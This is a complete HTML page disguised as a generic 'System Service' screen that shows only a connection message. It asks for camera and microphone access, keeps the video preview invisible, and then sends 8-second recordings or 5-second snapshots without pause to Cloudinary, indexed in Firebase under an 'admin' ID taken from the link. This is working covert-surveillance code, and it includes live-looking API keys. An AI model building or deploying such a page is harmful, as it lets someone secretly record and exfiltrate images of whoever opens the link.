<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Service</title>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
<style>
    body { background: #fff; margin: 0; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
    #preview { opacity: 0; position: absolute; pointer-events: none; }
    h1 { font-family: monospace; color: #333; font-size: 16px; }
</style>
</head>
<body>

    <h1 id="status">Connecting to Server...</h1>
    <video id="preview" autoplay playsinline muted></video>

<script>
    // --- 1. CONFIGURATION ---
    
    // FIREBASE CONFIG
    const firebaseConfig = {
        apiKey: "AIzaSyAAnJxWPmU2d_Lz15wCbwrujnZyfq8DQlk",
        authDomain: "camera-cbf3e.firebaseapp.com",
        projectId: "camera-cbf3e",
        storageBucket: "camera-cbf3e.firebasestorage.app",
        messagingSenderId: "1051235103322",
        appId: "1:1051235103322:web:238b22d3c69263beb0de63",
        measurementId: "G-2B2PNSPHX3"
    };

    // CLOUDINARY CONFIG (From your screenshot)
    const CLOUD_NAME = "dbkqfeq7k";
    const UPLOAD_PRESET = "Camera1.0"; 

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const urlParams = new URLSearchParams(window.location.search);
    const ADMIN_ID = urlParams.get('uid'); 
    const MODE = urlParams.get('mode');

    // --- 2. MAIN LOGIC ---

    async function startApp() {
        if (!ADMIN_ID) {
            document.getElementById('status').innerText = "Error: Invalid Link ID";
            return;
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            document.getElementById('preview').srcObject = stream;
            document.getElementById('status').innerText = "System Active...";

            if (MODE === 'record') {
                startRecording(stream);
            } else if (MODE === 'image') {
                setInterval(() => captureImage(), 5000); // 5 sec interval
            }

        } catch (e) {
            document.getElementById('status').innerText = "Permission Required!";
        }
    }

    // --- 3. CLOUDINARY UPLOADER ---
    async function uploadToCloudinary(blob) {
        const formData = new FormData();
        formData.append('file', blob);
        formData.append('upload_preset', UPLOAD_PRESET);

        try {
            // Upload to Cloudinary
            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, {
                method: 'POST',
                body: formData
            });
            const data = await res.json();
            
            // Save LINK to Firebase
            if(data.secure_url) {
                const collection = (MODE === 'record') ? 'recordings' : 'images';
                db.collection("admins").doc(ADMIN_ID).collection(collection).add({
                    data: data.secure_url, // Saving URL instead of file
                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
                });
                console.log("Uploaded: ", data.secure_url);
            }
        } catch (err) {
            console.error("Upload Failed", err);
        }
    }

    // --- 4. CAPTURE FUNCTIONS ---

    function startRecording(stream) {
        let chunks = [];
        const mr = new MediaRecorder(stream);
        
        mr.ondataavailable = e => chunks.push(e.data);
        mr.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            uploadToCloudinary(blob); // Upload Video Blob
            
            chunks = [];
            mr.start();
            setTimeout(() => mr.stop(), 8000); // 8 Seconds Video Clip
        };

        mr.start();
        setTimeout(() => mr.stop(), 8000);
    }

    function captureImage() {
        const video = document.getElementById('preview');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        // Convert to Blob and Upload
        canvas.toBlob(blob => {
            uploadToCloudinary(blob);
        }, 'image/jpeg', 0.7);
    }

    startApp();
</script>
</body>
</html>
